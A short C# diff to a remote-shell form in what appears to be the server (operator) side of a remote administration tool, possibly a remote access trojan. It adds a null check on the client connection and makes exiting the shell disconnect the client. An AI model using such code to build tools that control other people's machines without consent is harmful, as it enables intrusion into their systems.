@@ -26,6 +26,7 @@ namespace Server.Forms
 
         private void TextBox1_KeyDown(object sender, KeyEventArgs e)
         {
+            if (Client != null)
             if (e.KeyData == Keys.Enter && !string.IsNullOrWhiteSpace(textBox1.Text))
             {
                 if (textBox1.Text == "cls".ToLower())
@@ -64,10 +65,11 @@ namespace Server.Forms
 
         private void ExitShell()
         {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "shellWriteInput";
-            msgpack.ForcePathObject("WriteInput").AsString = "exit";
-            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+            try
+            {
+                Client?.Disconnected();
+            }
+            catch { }
         }
     }
 }
